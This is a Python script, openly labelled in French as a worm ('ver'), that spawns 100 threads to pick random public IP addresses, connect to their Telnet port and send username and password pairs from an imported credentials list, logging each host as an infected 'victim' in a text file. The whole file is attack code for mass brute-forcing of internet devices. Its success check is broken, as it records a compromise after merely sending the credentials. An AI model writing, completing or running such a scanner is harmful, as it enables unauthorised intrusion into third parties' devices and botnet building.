import socket
import random
import threading
import time
from credentials import creds

MAX_THREADS = 100  
TIMEOUT = 0.8      

def is_valid_public_ip(ip):
    blocks = ip.split('.')
    if blocks[0] in ['10', '127', '169', '172', '192'] or blocks[0] == '0':
        return False
    return True

def try_telnet_exploit(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(TIMEOUT)
    try:
        s.connect((ip, 23))
        for user, pwd in creds:
            try:
                s.send(f"{user}\n".encode())
                time.sleep(0.1)
                s.send(f"{pwd}\n".encode())
                
                with open("victims.txt", "a") as f:
                    f.write(f"[SUCCESS] {ip} | {user}:{pwd}\n")
                print(f" [+] VICTOIRE : {ip} infecté !")
                break
            except:
                continue
    except:
        pass
    finally:
        s.close()

def worm_loop():
    while True:
        target_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        if is_valid_public_ip(target_ip):
            try_telnet_exploit(target_ip)

if __name__ == "__main__":
    print(f"[*] Lancement du ver en mode multi-thread ({MAX_THREADS} threads)...")
    
    for i in range(MAX_THREADS):
        t = threading.Thread(target=worm_loop, daemon=True)
        t.start()

    while True:
        time.sleep(1)